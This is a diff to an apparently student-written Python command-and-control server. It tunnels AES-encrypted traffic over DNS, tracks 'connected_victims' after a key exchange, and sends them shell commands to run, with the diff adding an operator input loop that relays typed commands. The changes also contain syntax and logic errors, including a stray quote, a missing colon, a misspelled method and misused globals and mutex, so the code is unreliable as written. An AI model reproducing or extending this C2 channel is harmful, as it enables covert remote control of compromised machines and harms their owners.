@@ -4,6 +4,7 @@ Naor Maman        207341777
 """
 import binascii
 import base64
+from threading import Thread
 
 import pyDH as pyDH
 from Crypto.Cipher import AES
@@ -27,6 +28,7 @@ stat_code = 0
 connected_victims = {}  # keys: identifies victims' numbers,
 # values: to each: [shared key, encrypting object, decrypting object, os type]
 need_2_send: List[bytes] = []
+input_buffer = ""
 
 
 def listen_socket():
@@ -121,13 +123,13 @@ def send_command(request: DNSQR, identify: bytes, ans_code: int, enc_data: bytes
     """
     data = decode_msg(identify, enc_data)
     print('answer from ', identify, ' with code ', ans_code, ':\n', data)
-
-    # TODO: do real something
-    # response_data = build_response(identify, SERVER_COMMANDS['ok&process'], b'got your answer!')
-    # send_response(request, response_data)
-
-    response_data = build_response(identify, SERVER_COMMANDS['ok&sleep'], b'100')
-    send_response(request, response_data)
+    if input_buffer != '':
+        response_data = build_response(identify, SERVER_COMMANDS['ok&process'], input_buffer.encode()')
+        send_response(request, response_data)
+        input_buffer = ''
+    else
+        response_data = build_response(identify, SERVER_COMMANDS['ok&sleep'], b'100')
+        send_response(request, response_data)
 
 
 def send_next_part(request: DNSQR, identify: bytes):
@@ -220,13 +222,15 @@ def key_exchange3(request: DNSQR, identify: bytes, enc_victim_os: bytes):
     print("[!] New victim is connected!")
     curr_vic = connected_victims[identify]
     print(f"[!] His stats: {identify}, {curr_vic[0].decode(), curr_vic[-1]}")
-
-    response_data = build_response(identify, SERVER_COMMANDS['ok&process'], b'ip a')
-    send_response(request, response_data)
-
-    # print("[!]send him to sleep!")
-    # response_data = build_response(SERVER_COMMANDS['ok&sleep'], b'100')
-    # send_response(request, response_data)
+    
+    if input_buffer != '':
+        response_data = build_response(identify, SERVER_COMMANDS['ok&process'], input_buffer.encdoe()))
+        send_response(request, response_data)
+        input_buffer = ''
+    else:
+        print("[!]send him to sleep!")
+        response_data = build_response(SERVER_COMMANDS['ok&sleep'], b'100')
+        send_response(request, response_data)
 
 
 # endregion
@@ -403,4 +407,10 @@ def decode_msg(identify, encrypted_msg: bytes) -> str:
 
 
 if __name__ == "__main__":
-    run()
+    t1 = Thread(target=run)
+    t1.start()
+    while(True):
+        with mutex:
+            input_buffer = raw_input();
+            mutex.acquire()
+        input_buffer = ""
